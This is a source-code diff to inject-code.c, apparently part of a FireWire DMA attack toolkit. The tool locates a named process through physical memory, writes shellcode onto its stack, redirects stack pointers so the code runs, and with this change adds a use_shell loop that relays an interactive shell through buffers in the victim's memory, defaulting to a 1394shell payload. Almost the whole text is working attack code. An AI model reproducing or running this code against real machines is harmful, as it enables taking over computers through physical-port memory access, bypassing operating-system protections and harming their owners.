@@ -1,4 +1,4 @@
-/*  $Id$
+/*  $Id: inject-code.c 290 2007-01-25 12:11:20Z lostrace $
  *  vim: fdm=marker
  *
  *  inject-code: inject some code into a process
@@ -53,7 +53,8 @@ char pagedir[4096];
 // values of aggressiveness:
 // 	 & 1: write (but only at locations that are pointers into the binary)
 // 	 & 2: also try anywhere that may be a pointer to 0x08~~~~~~ or 0xb7~~~~~~ (does not write if not &1)
-uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen, int aggressiveness)
+// returns virtual address where the injectcode has been injected
+uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int injectcodelen, int aggressiveness)
 {{{
 	// i386-code that marks itself when being executed:
 	//
@@ -90,7 +91,7 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int cod
 	addr_t code_location;
 	addr_t mark_location;
 	char*code;
-	char page[4096];
+	int codelen;
 
 	printf("\t" TERM_BLUE"aggressiveness: %s, %s" TERM_RESET "\n",
 			(aggressiveness&1)? "writing"         : "pretending",
@@ -99,13 +100,15 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int cod
 
 	// we attach a self-changing marker to the shellcode. this way we can test,
 	// if the shellcode has been executed, yet.
-	code = malloc(codelen + MARKER_LEN + 1);
+	codelen = injectcodelen + MARKER_LEN;
+	code = malloc(codelen + 1);
 	memcpy(code, marker, MARKER_LEN);
-	memcpy(code + MARKER_LEN, injectcode, codelen);
-	codelen += MARKER_LEN;
+	memcpy(code + MARKER_LEN, injectcode, injectcodelen);
 
 	// seek the stack-page with environment and stuff
 	stack_bottom = linear_seek_mapped_page(lin, 0xbffff, 0x1000, -1);
+
+	// and here we will inject the code.
 
 	// seek bounds of mapped binary
 	binary_first = linear_seek_mapped_page(lin, 0x08000, 0x1000, 1);
@@ -114,41 +117,21 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int cod
 	if( ((int64_t)stack_bottom == -1) || ((int64_t)binary_first == -1) || ((int64_t)binary_last == -1) ) {
 		printf("\tfailed to find stack or binary bounds!\n"
 			"\taborting!\n");
-		return;
+		return -1;
 	}
 
 	binary_last--;				// go to last mapped
 	binary_first = binary_first << 12;	// get addresses from pagenumbers
 	binary_last = binary_last << 12;
 
-	//
-	// inject code into stack, right before arguments
-	// seek the place to inject:
-	char*p;
-	char*q;
-
-	int is_not_empty=0;
-	linear_read_page(lin, stack_bottom, page);
-	p = page+4096 - 1 - 4;
-	while( (*p != 0) || (*(p-1) != 0) )
-		p--;
-	p--;
-	p -= codelen;
-	code_location = (p - page) + (stack_bottom << 12);
+	//insert code at offset zero of this page.
+	code_location = (stack_bottom << 12);
 	mark_location = code_location + MARK_OFFSET;
-	// check if there is place (should be all zero)
-	q = p+codelen;
-	for(p = p; p <= q; p++)
-		if(*p)
-			is_not_empty=1;
-	if(is_not_empty)
-		printf("\t" TERM_BLUE "the place where i am injecting MAY contain process-data or -stack!" TERM_RESET "\n");
-	//insert code
 	printf("\tinserting code into the stack at 0x%08llx\n", code_location);
 	if(aggressiveness & 1)
 		if(linear_write(lin, code_location, code, codelen)) {
 			printf(TERM_RED"failed to inject code!"TERM_RESET"\n");
-			return;
+			return -1;
 		}
 
 	printf("\tdone. press key to overwrite pointers on stack...\n");
@@ -217,11 +200,103 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int cod
 	printf("\t* mark is 0x%08x\n",mark_value);
 	linear_read(lin, mark_location + ( ESP_OFFSET - MARK_OFFSET ), &mark_value, 4);
 	printf("\t* ESP was 0x%08x\n",mark_value);
+
+	return code_location + MARKER_LEN;
+}}}
+
+void use_shell(linear_handle lin, uint32_t base)
+{{{
+	// these depend on the used shellcode:
+#define CHILD_IS_DEAD	0x222
+#define CHILD_IS_DEAD_ACK 0x223
+#define TERMINATE_CHILD	0x224
+
+#define RFRM_WRITER_POS	0x227
+#define RFRM_WRITER_POS_START_POSITION 7
+#define RFRM_READER_POS	0x228
+#define RFRM_BUFFER	0x24A
+
+#define RTO_WRITER_POS	0x229
+#define RTO_READER_POS	0x22a
+#define RTO_BUFFER	0x34c
+
+	const uint8_t true_value = 0x1;
+
+	uint8_t child_is_dead = 0;
+
+	uint8_t rfrm_writer_pos = RFRM_WRITER_POS_START_POSITION;
+	uint8_t rfrm_reader_pos = 0;
+	char    rfrm_buffer[2]; // master -> shell
+	int	rfrm_active;
+
+	uint8_t rto_writer_pos = 0;
+	uint8_t rto_reader_pos = 0;
+	char    rto_buffer[2]; // shell -> master
+	int	rto_active;
+
+#define SET_rfrm_writer_pos linear_write_in_page(lin, base + RFRM_WRITER_POS, &rfrm_writer_pos, 1)
+#define GET_rfrm_reader_pos linear_read_in_page(lin, base + RFRM_READER_POS, &rfrm_reader_pos, 1)
+#define GET_rto_writer_pos linear_read_in_page(lin, base + RTO_WRITER_POS, &rto_writer_pos, 1)
+#define SET_rto_reader_pos linear_write_in_page(lin, base + RTO_READER_POS, &rto_reader_pos, 1)
+#define GET_child_is_dead linear_read_in_page(lin, base + CHILD_IS_DEAD, &child_is_dead, 1)
+#define ACK_child_is_dead linear_write_in_page(lin, base + CHILD_IS_DEAD, &child_is_dead, 1)
+#define DO_terminate_child linear_write_in_page(lin, base + TERMINATE_CHILD, &true_value, 1)
+
+	int flags;
+	// set STDIN to non-blocking.
+	flags = fcntl(STDIN_FILENO, F_GETFL);
+	flags |= O_NONBLOCK;
+	fcntl(STDIN_FILENO, F_SETFL, flags);
+
+	// while the child lives
+	while(!child_is_dead) {
+		// can we write something?
+		GET_rfrm_reader_pos;
+		if(rfrm_reader_pos != rfrm_writer_pos + 1) {
+			// buffer is not full. let's try to obtain data from stdin
+			if(1 == read(STDIN_FILENO, rfrm_buffer, 1)) {
+				// there was some data.let's relay it.
+				linear_write_in_page(lin, base + RFRM_BUFFER + rfrm_writer_pos, rfrm_buffer, 1);
+				rfrm_writer_pos++;
+				SET_rfrm_writer_pos;
+				rfrm_active = 1;
+			} else {
+				rfrm_active = 0;
+			}
+		} else {
+			rfrm_active = 0;
+		}
+
+		GET_rto_writer_pos;
+		if(rto_reader_pos != rto_writer_pos) {
+			// buffer is not empty. obtain data and display it.
+			linear_read_in_page(lin, base + RTO_BUFFER + rto_reader_pos, rto_buffer, 1);
+			rto_reader_pos++;
+			SET_rto_reader_pos;
+			rfrm_active = 1;
+			putchar(rto_buffer[0]);
+		} else {
+			rfrm_active = 0;
+		}
+
+		if(!rfrm_active && !rto_active)
+			usleep(50000);
+
+		if(!child_is_dead)
+			GET_child_is_dead;
+	}
+	ACK_child_is_dead;
+
+	// set STDIN back to blocking.
+	flags = fcntl(STDIN_FILENO, F_GETFL);
+	flags -= O_NONBLOCK;
+	fcntl(STDIN_FILENO, F_SETFL, flags);
+
 }}}
 
 void usage(char* argv0)
 {{{
-	printf( "%s [-] <"TERM_YELLOW"-n nodeid"TERM_RESET"|"TERM_YELLOW"-f filename"TERM_RESET"> -b <binary> -c <codefile>\n"
+	printf( "%s [-] <"TERM_YELLOW"-n nodeid"TERM_RESET"|"TERM_YELLOW"-f filename"TERM_RESET"> -b <binary>\n"
 		"\ninject -c <codefile> into first process matching the -b <binary>\n"
 		"\t\tgive -p to pretend (then i will not write anything, only read)\n"
 		"\t\t* the host connected via firewire with the given nodeid\n"
@@ -241,15 +316,17 @@ int main(int argc, char**argv)
 	int c;
 	char *p;
 	char *seek_binary = NULL;
-	char *inject_file = NULL;
+	char *inject_file = "shellcodes/1394shell.o";
 	int pretend = 0;
 	int aggressive = 0;
+
+	uint32_t base;
 
 	enum memsource memsource = SOURCE_UNDEFINED;
 	char *filename = NULL;
 	int nodeid = 0;
 
-	while( -1 != (c = getopt(argc, argv, "pan:f:b:c:"))) {
+	while( -1 != (c = getopt(argc, argv, "pan:f:b:"))) {
 		switch (c) {
 			case 'p':
 				pretend = 1;
@@ -274,9 +351,6 @@ int main(int argc, char**argv)
 				break;
 			case 'b':
 				seek_binary = optarg;
-				break;
-			case 'c':
-				inject_file = optarg;
 				break;
 			default:
 				usage(argv[0]);
@@ -397,7 +471,7 @@ int main(int argc, char**argv)
 							printf("\tgot %d bytes from \"%s\".\n", codelen, inject_file);
 						}
 
-						try_inject(lin, pn, codebuffer, codelen, (pretend ? 0 : 1) | (aggressive ? 2 : 0));
+						base = try_inject(lin, pn, codebuffer, codelen, (pretend ? 0 : 1) | (aggressive ? 2 : 0));
 						close(fd);
 
 						break;
@@ -406,6 +480,50 @@ int main(int argc, char**argv)
 			}
 		}
 	}
+	// the fork of the shellcode may have changed the pagedirectory or even its location.
+	// so let's search the process again...
+	sleep(1);
+	for( pn = 0; pn < 0x40000; pn++ ) {
+		if((pn%0x100) == 0) {
+			printf("0x%05llx\r", pn);
+			fflush(stdout);
+		}
+		if(linear_is_pagedir_fast(lin, pn)) {
+			// load page
+			physical_read_page(phy, pn, page);
+			prob = linear_is_pagedir_probability(lin, page);
+			if(prob > 0.01) {
+				printf("0x%05llx [~%0.3f] ", pn, prob);
+				if(linear_set_new_pagedirectory(lin, page)) {
+					printf("\nloading pagedir failed\n");
+					continue;
+				}
+
+				int argc, envc;
+				char **argv, **envv;
+				char *bin;
+
+				proc_info(lin, &argc, &argv, &envc, &envv, &bin);
+				if(bin) {
+					printf("found <\"%s\">\n", bin);
+					if(0 == strcmp(bin, seek_binary)) {
+						int fd;
+#define CODEBUFFERSIZE 4096
+						char codebuffer[CODEBUFFERSIZE];
+						int codelen;
+
+						printf("\tmatching once again.\n");
+
+						use_shell(lin, base);
+
+						break;
+					}
+				}
+			}
+		}
+	}
+
+
 
 	// release handles
 	linear_handle_release(lin);
